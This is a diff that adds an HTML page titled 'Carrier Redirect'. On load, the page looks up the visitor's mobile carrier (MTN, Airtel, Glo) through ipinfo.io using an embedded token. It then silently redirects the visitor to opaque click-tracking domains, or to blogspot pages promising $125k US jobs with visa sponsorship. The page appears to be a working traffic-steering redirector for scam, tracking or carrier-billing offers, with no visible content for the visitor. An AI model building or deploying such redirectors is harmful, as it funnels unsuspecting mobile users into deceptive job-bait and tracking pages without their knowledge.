@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Carrier Redirect</title>
+  <script>
+  fetch("https://ipinfo.io/json?token=908bedac2d641f") // replace with your token
+  .then(res => res.json())
+  .then(data => {
+      let carrier = (data.org || "").toLowerCase();
+
+      if(carrier.includes("mtn")) {
+          window.location.replace("https://4860157.s2.clicksrefresh.com/?mob=76V3pQcOwjQpnD8uNJS_AzHKwomvChkg_yGVcZcHs_I");
+      } else if(carrier.includes("airtel")) {
+          window.location.replace("https://fkrfhb.one/cl/46744ff2461db936");
+      } else if(carrier.includes("glo")) {
+          window.location.replace("https://fkrfhb.one/cl/7704499c2f59941a");
+      } else {
+          // Fallback: show a manual selection page
+          window.location.replace("https://maharunglobal.blogspot.com/2025/09/125k-usa-cybersecurity-jobs-visa-sponsorship-available-2026.html");
+      }
+  })
+  .catch(err => {
+      window.location.replace("https://maharunglobal.blogspot.com/2025/10/125k-visa-sponsorship-opportunities-for-immigrants-in-the-usa.html"); // API failed
+  });
+  </script>
+</head>
+<body>
+</body>
+</html>
